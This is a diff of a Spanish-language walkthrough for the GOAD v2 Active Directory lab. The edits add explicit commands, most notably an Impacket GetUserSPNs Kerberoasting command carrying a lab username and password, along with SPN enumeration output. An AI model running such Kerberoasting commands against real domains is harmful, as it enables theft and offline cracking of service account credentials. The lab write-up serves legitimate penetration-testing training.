@@ -1030,11 +1030,11 @@ Después de configurar el servidor, puedes acceder a través de tu navegador en 
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%203.png)
 
-Cuando observamos el archivo "domain_users.html", su contenido se presenta de la siguiente forma.
+Cuando observamos el archivo "domain_users.html", por ejemplo su contenido se presenta de la siguiente forma.
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%204.png)
 
-Cómo se establece una conexión con "sevenkingdoms.local”
+Pedemos observar también que se establece una conexión con "sevenkingdoms.local” en el archivo llamado domain_trusts.html
 
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%205.png)
 
@@ -1062,7 +1062,7 @@ distinguishedName: CN=lord.varys,OU=Crownlands,DC=sevenkingdoms,DC=local
 distinguishedName: CN=maester.pycelle,OU=Crownlands,DC=sevenkingdoms,DC=local
 ```
 
-Un listado completo de los usuarios de "sevenkingdoms.local" ya ha sido obtenido.
+Tenemos un listado completo de los usuarios de "sevenkingdoms.local"
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
@@ -1109,7 +1109,7 @@ MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                    
 MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102
 ```
 
-Ahora se procederá a obtener los TGS (Service Tickets).
+Ahora se procederá a obtener los TGS (Service Tickets) con el comando `GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes` con esto exportamos los TGS en un archivo llamado kerberoasting.hashes
 
 ```jsx
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
@@ -1128,7 +1128,7 @@ MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                    
 [-] CCache file is not found. Skipping...
 ```
 
-Se procede a la lectura del archivo recién creado.
+Se procede a la lectura del archivo recién creado con el comando `cat kerberoasting.hashes`
 
 ```jsx
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
